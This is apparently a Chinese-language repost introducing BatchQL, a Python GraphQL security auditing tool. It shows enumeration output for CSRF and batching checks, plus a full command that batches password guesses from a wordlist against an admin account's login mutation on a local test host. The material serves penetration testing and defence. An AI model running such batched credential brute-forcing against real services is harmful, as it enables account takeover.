## 关于BatchQL

BatchQL是一款功能强大的GraphQL的安全审计工具，可以通过执行Batch
GraphQL查询和输入变异数据来了解目标GraphQL应用的安全情况。该工具基于Python开发，其实现代码并不复杂，因此欢迎社区的广大研究人员和开发人员贡献自己的代码。

## 检测内容

当前版本的BatchQL支持检测下列内容：

> 支持各类查询方式；
>
> 模式建议检测；
>
> CSRF检测
>
> 基于查询名称的Batching；
>
> 基于查询JSON列表的Batching；

## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/assetnote/batchql.git

## 工具使用

### 信息枚举

    
    
    ❯ python batch.py -e http://re.local:5000/graphiql -p localhost:8080
    Schema suggestions enabled. Use Clairvoyance to recover schema: https://github.com/nikitastupin/clairvoyance
    CSRF GET based successful. Please confirm that this is a valid issue.
    CSRF POST based successful. Please confirm that this is a valid issue.
    Query name based batching: GraphQL batching is possible... preflight request was successful.
    Query JSON list based batching: GraphQL batching is possible... preflight request was successful.
    Most provide query, wordlist, and size to perform batching attack.

### Batching攻击

首先，保存一个包含有目标GraphQL查询的文件，例如acc-login.txt：

    
    
    mutation emailLoginRemembered($loginInput: InputRememberedEmailLogin!) {
    
      emailLoginRemembered(loginInput: $loginInput) {
    
        authToken {
    
          accessToken
    
          __typename
    
        }
    
        userSessionResponse {
    
          userToken
    
          userIdentity {
    
            userId
    
            identityType
    
            verified
    
            onboardingStatus
    
            registrationReferralCode
    
            userReferralInfo {
    
              referralCode {
    
                code
    
                valid
    
                __typename
    
              }
    
              __typename
    
            }
    
            __typename
    
          }
    
          __typename
    
        }
    
        __typename
    
      }
    
      }

接下来，运行下列命令来执行GraphQL Batching攻击：

    
    
    ❯ python batch.py --query acc-login.txt --wordlist passwords.txt -v '{"loginInput":{"email":"admin@example.com","password":"#VARIABLE#","rememberMe":false}}' --size 100 -e http://re.local:5000/graphiql -p localhost:8080

上述命令将实现下列内容：

 **1、从一个本地文件执行特定的请求：**

    
    
    --query acc-login.txt

 **2、指定一个字典：**

    
    
    --wordlist passwords.txt

 **3、指定变量输入（使用替换识别符）：**

    
    
    -v {"loginInput":{"email":"admin@example.com","password":"#VARIABLE#","rememberMe":false}}

 **4、指定Batch大小：**

    
    
    --size 100

 **5、指定目标节点：**

    
    
    -e http://re.local:5000/graphiql

 **6、指定一个代理：**

    
    
    -p localhost:8080

## 项目地址

 **BatchQL：** 【[ _GitHub传送门_](https://github.com/assetnote/batchql)】

 **参考资料**

> [ _https://blog.assetnote.io/2021/08/29/exploiting-> graphql/_](https://blog.assetnote.io/2021/08/29/exploiting-graphql/)
>
> [ _https://github.com/dolevf/Damn-Vulnerable-GraphQL-> Application_](https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application)
>
> [ _https://lab.wallarm.com/graphql-batching-> attack/_](https://lab.wallarm.com/graphql-batching-attack/)
>
> [
> _https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html#mitigating-> batching-> attacks﻿_](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html#mitigating-> batching-attacks)

